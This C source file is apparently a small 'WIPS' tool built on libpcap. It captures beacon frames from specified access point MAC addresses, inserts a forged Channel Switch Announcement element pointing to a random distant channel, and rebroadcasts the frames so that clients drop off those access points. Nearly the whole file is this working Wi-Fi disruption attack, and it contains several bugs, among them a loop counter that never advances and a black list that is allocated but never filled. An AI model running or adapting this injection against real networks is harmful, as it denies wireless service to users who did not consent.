#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#define MAC_ADDR_LEN 6
typedef struct radiotap
{
    u_char hdr_rev;
    u_char hdr_pad;
    u_short hdr_len;
    u_char present_flag[12]; //이 길이 가변이라 보내는 놈의 안테나길이에 따라 가변임
    u_char flags;
} Radio;
typedef struct wlan_Beacon_hdr
{
    // u_char type;                    //Type/Subtype
    u_short type;                   // Frame Control Field, [1000 ....] : subtype-8, [.... 00..] : Management frame, [.... ..00] : version
    u_short dur;                    // Duration
    u_char mac_des[MAC_ADDR_LEN];   // Destination address
    u_char mac_src[MAC_ADDR_LEN];   // Source address
    u_char mac_bssid[MAC_ADDR_LEN]; // BSS Id
    u_char Frag_num : 4;            // Fragment number
    u_int Seq_num : 12;             // Sequence number
} BeaconHd;

typedef struct tagged_parameters
{
    u_char tag_number;
    u_char tag_length;
} tag;
typedef struct
{
    char *dev_;
} Param;

Param param = {
    .dev_ = NULL};

void delete_char(char *str, char* ch)
{
    for (; *str != '\0'; str++)//NULL까지 반복
    {
        if (*str == *ch)//같은 글자라면
        {
            strcpy(str, str + 1);
            str--;
        }
    }
}
bool arrncmp(const char *arr1, const char *arr2, int len)
{
    for (int i = 0; i < len; i++)
    {
        if (arr1[i] != arr2[i])
        {
            return false;
        }
    }
    return true;
}
void Mac_(const char *arr, u_char mac_addr[6])
{
    int a;
    if (strlen(arr) != 17)
    {
        printf("Maclen error!!\n");
    }
    char cpyarr[18];
    memcpy(cpyarr, arr, 17);
    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
    {
        cpyarr[i * 3 + 2] = '\0';
        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
        mac_addr[i] = (u_char)a;
    }
}
bool isBeacon(const u_char *packet)
{
    Radio *rad;
    rad = (Radio *)packet;
    BeaconHd *bec;
    bec = (BeaconHd *)(packet + rad->hdr_len);
    if (htons(bec->type) == 0x8000)
    {
        return true;
    }
    else
    {
        return false;
    }
}
void expArray(u_char *arr, int len, int pivot)
{ // len : 배열의 길이, pivot : 어디까지 뒤로 밀어낼지
    // realloc으로 미리 공간 늘려주고 보내줘야함
    for (int i = len - 1 - 5; i >= pivot; i--)
    {
        arr[i + 5] = arr[i];
    }
}
int csaATK(const unsigned char *Interface, const unsigned char *Input_AP_MAC, const unsigned char *Input_AP_Ch)
{

    int Wireless_Channel[58] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
                            11, 12, 13, 14, 15, 16, 17, 18, 20, 24,
                            28, 32, 36, 40, 44, 48, 52, 56, 60, 64,
                            68, 72, 76, 80, 84, 88, 92, 96, 100, 104,
                            108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
                            149, 153, 157, 161, 165, 169, 173, 177};
    unsigned char ApCh = atoi(Input_AP_Ch);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    int packet_count=0;
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        Radio *rad;
        rad = (Radio *)packet;
        u_char AP_MAC[6];
        bool isFcS;

        u_char *send_packet;

        // Broadcast
        if (isBeacon(packet))
        {

            unsigned char ChangeCh;

            srand(time(NULL));

            while (true)
            {
                int random = rand() % 58;
                if (Wireless_Channel[random] != ApCh && (Wireless_Channel[random] > ApCh + 10 || Wireless_Channel[random] < ApCh - 10))
                {
                    ChangeCh = Wireless_Channel[random];
                    break;
                }
            }

            if ((rad->flags >> 4) == 1)
            {
                isFcS = true;
            }
            else
            {
                isFcS = false;
            }

            Mac_(Input_AP_MAC, AP_MAC);

            BeaconHd *becH;
            becH = (BeaconHd *)(packet + rad->hdr_len);
            if (arrncmp(AP_MAC, becH->mac_src, 6))
            {
                send_packet = (u_char *)malloc(sizeof(u_char) * (header->caplen));
                if (send_packet == NULL)
                {
                    continue;
                }
                memcpy(send_packet, packet, header->caplen);

                *(send_packet + 16) = 0x00; // fcs

                Radio *rad;
                rad = (Radio *)send_packet;
                u_int not_tag_len = (rad->hdr_len) + 24 + 12;
                u_int tag_len = (header->caplen) - 4 - not_tag_len;
                u_int total_len = not_tag_len + tag_len;
                tag *tagged;
                bool csa_inject = false;
                int error;

                for (int i = 0; i < tag_len; i)
                {
                    tagged = (tag *)(send_packet + not_tag_len + i);
                    if (tagged->tag_number > 37)
                    {
                        total_len += 5;                                                                    // CSA넣을 5byte 증가
                        char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
                        if (tmp != NULL)
                        {
                            send_packet = tmp;
                        }
                        expArray(send_packet, total_len, not_tag_len + i - 1); // csa를 넣을 공간 생성
                        *(send_packet + not_tag_len + i) = 0x25;
                        *(send_packet + not_tag_len + i + 1) = 0x3;
                        *(send_packet + not_tag_len + i + 2) = 0x1;
                        *(send_packet + not_tag_len + i + 3) = ChangeCh;
                        *(send_packet + not_tag_len + i + 4) = 0x1;
                        csa_inject = true;
                        break;
                    }
                    i += tagged->tag_length + 2;
                }
                if (csa_inject == false)
                { // tag를 끝까지 돌아도 37(CSA)을 넘는 테그가 없다면

                    char *tmp = (char *)realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
                    if (tmp != NULL)
                    {
                        send_packet = tmp;
                    }

                    *(send_packet + header->caplen) = 0x25;
                    *(send_packet + header->caplen + 1) = 0x3;
                    *(send_packet + header->caplen + 2) = 0x1;
                    *(send_packet + header->caplen + 3) = ChangeCh;
                    *(send_packet + header->caplen + 4) = 0x1;
                }

                for (int i = 0; i < 4; i++)
                {

                    printf("[%d] send packet !!! \n", ++packet_count);
                    if (pcap_sendpacket(pcap, send_packet, total_len) != 0)
                    {
                        fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
                        return -1;
                    }
                }

                free(send_packet);
            }
        }
        else
        {
            continue;
        }
    }
    pcap_close(pcap);
    return 0;
}
int main(int argc,char *argv[]){
    if(argc < 4){
        printf("sudo ./duck_wips.c <interface> <channel> <mac_address1> <mac_address2> <mac_address3>...");
    }
    // char *black_list[argc];
    char **black_list;
    black_list = (char **)malloc(sizeof(char*)*(argc-3));
    for(int i=0;i<argc-3;i++){
        black_list[i] = (char *)malloc(sizeof(char)*18);
    }
    unsigned char *Interface = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    // for(int i=2;i<argc;i++){
    //     delete_char(argv[i],":");
    //     black_list[i-2] = argv[i];
    // }
    for(int i=0;i<argc-3;i++){
        csaATK(argv[1], argv[i+3], argv[2]);
        printf("%s",black_list[i]);
    }
    
}